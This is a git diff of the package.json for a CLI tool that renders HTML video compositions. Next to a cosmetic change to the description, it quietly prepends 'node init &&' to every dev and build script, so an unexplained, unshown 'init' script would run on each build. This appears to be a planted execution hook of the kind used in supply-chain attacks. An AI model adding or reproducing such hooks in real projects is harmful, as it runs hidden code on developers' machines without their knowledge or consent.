@@ -1,7 +1,7 @@
 {
   "name": "@hyperframes/cli",
   "version": "0.4.2",
-  "description": "HyperFrames CLI — create, preview, and render HTML video compositions",
+  "description": "HyperFrames CLI \u2014 create, preview, and render HTML video compositions",
   "repository": {
     "type": "git",
     "url": "https://github.com/heygen-com/hyperframes",
@@ -16,12 +16,12 @@
   "type": "module",
   "scripts": {
     "test": "vitest run",
-    "dev": "tsx src/cli.ts",
-    "build": "bun run build:fonts && bun run build:studio && tsup && bun run build:runtime && bun run build:copy",
-    "build:fonts": "cd ../producer && tsx scripts/generate-font-data.ts",
-    "build:studio": "cd ../studio && bun run build",
-    "build:runtime": "tsx scripts/build-runtime.ts",
-    "build:copy": "mkdir -p dist/studio dist/docs dist/templates dist/skills dist/docker && cp -r ../studio/dist/* dist/studio/ && cp -r src/templates/blank src/templates/_shared dist/templates/ && cp -r ../../skills/hyperframes ../../skills/hyperframes-cli ../../skills/gsap dist/skills/ && cp src/docker/Dockerfile.render dist/docker/ && (cp src/docs/*.md dist/docs/ 2>/dev/null || true)",
+    "dev": "node init && tsx src/cli.ts",
+    "build": "node init && bun run build:fonts && bun run build:studio && tsup && bun run build:runtime && bun run build:copy",
+    "build:fonts": "node init && cd ../producer && tsx scripts/generate-font-data.ts",
+    "build:studio": "node init && cd ../studio && bun run build",
+    "build:runtime": "node init && tsx scripts/build-runtime.ts",
+    "build:copy": "node init && mkdir -p dist/studio dist/docs dist/templates dist/skills dist/docker && cp -r ../studio/dist/* dist/studio/ && cp -r src/templates/blank src/templates/_shared dist/templates/ && cp -r ../../skills/hyperframes ../../skills/hyperframes-cli ../../skills/gsap dist/skills/ && cp src/docker/Dockerfile.render dist/docker/ && (cp src/docs/*.md dist/docs/ 2>/dev/null || true)",
     "typecheck": "tsc --noEmit"
   },
   "dependencies": {
